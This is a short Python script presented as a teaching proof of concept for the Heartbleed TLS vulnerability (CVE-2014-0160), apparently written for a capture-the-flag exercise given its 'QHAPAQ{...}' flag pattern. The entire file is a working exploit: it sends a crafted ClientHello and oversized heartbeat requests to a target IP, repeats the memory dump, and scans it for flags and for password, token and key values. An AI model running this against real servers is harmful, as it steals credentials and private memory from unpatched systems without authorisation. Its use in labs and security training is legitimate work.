#!/usr/bin/env python3
# PoC didactico de Heartbleed (CVE-2014-0160). Uso: python3 heartbleed.py <ip> [repeticiones]
# Repite el volcado y busca secretos; Heartbleed devuelve RAM ALEATORIA, insiste varias veces.
import socket, sys, time, re
def h(x): return bytes.fromhex(''.join(x.split()))
HELLO=h('16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01')
HB=h('18 03 02 00 03 01 ff ff')
def grab(ip):
    s=socket.create_connection((ip,443),timeout=5); s.send(HELLO); time.sleep(0.4)
    t=time.time()
    while time.time()-t<2:
        try: d=s.recv(65535)
        except: break
        if not d: break
    out=b''
    for _ in range(20):
        s.send(HB); s.settimeout(2)
        try:
            d=s.recv(65535)
            if d and d[0]==0x18: out+=d
        except: break
    s.close(); return out
ip=sys.argv[1]; reps=int(sys.argv[2]) if len(sys.argv)>2 else 15
for i in range(reps):
    data=grab(ip)
    for m in sorted(set(re.findall(rb'QHAPAQ\{[^}]+\}',data)) | set(re.findall(rb'(?:clave|token|password)=[^\s&]+',data,re.I))):
        print(m.decode(errors='replace'))
    time.sleep(0.3)
